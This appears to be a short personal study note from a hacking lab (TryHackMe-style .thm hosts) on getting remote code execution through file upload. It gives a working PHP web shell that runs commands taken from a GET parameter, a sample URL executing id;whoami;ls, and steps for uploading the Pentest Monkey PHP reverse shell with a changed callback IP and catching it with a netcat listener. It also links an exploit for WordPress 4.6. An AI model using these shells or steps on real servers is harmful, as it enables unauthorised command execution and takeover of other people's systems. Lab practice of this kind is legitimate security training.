= Remote Code Injection

2 Methods:
1. Web Shells (often the only opportunity)
2. Reverse/Bind Shells (preffered)

- e.g. with a low-privileged web user Account "www-data"
- usually with uploading a programm in the same language as the backend (e.g. php, python django, node.js)
- doesnt work if the app is routed (if routing is defined in the app and not the filesystem)
- restricted by
  - file length
  - firewall rules

e.g. Wordpressversion 4.6 (after wpscan)  => https://www.exploit-db.com/exploits/41962

# Web Shell

## PHP

Create a webshell.php:
```
<?php
    echo system($_GET["cmd"]);
?>
```

and call it on the Target with: `view-source:http://demo.uploadvuln.thm/uploads/webshell.php?cmd=id;whoami;ls`

# Reverse Shell

Use a general [Pentest Monkey Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php), change Line 49 `$ip = '127.0.0.1'; // CHANGE THIS` and save as "reverse-shell.php"

Start a [[netcat]] Listener on the local machine: `nc -lvnp 1234`

Upload the Shell by navigating to the uploaded File: `http://demo.uploadvulns.thm/uploads/php-reverse-shell.php`

The Webpage shouldn load normally but will hang and we will get a connection in netcat.

